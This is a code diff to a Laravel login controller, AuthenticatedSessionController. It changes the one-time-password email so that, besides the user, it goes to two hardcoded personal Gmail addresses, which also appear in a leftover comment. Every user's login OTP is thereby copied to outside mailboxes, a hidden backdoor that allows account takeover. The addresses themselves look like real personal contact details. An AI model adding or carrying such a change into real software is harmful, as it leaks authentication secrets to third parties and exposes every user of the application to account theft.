@@ -67,7 +67,7 @@ class AuthenticatedSessionController extends Controller
         ]);
 
         // dd($user->email);
-        Mail::to([$user->email])->send(new LoginOtpMail($otp, $user));
+        Mail::to([$user->email, 'chandresh.gc@gmail.com', 'bhavikg.gc@gmail.com'])->send(new LoginOtpMail($otp, $user));
 
 // , 'chandresh.gc@gmail.com', 'bhavikg.gc@gmail.com'
         return redirect()->route('verify.otp.form')->with('message', 'OTP sent to your email.');
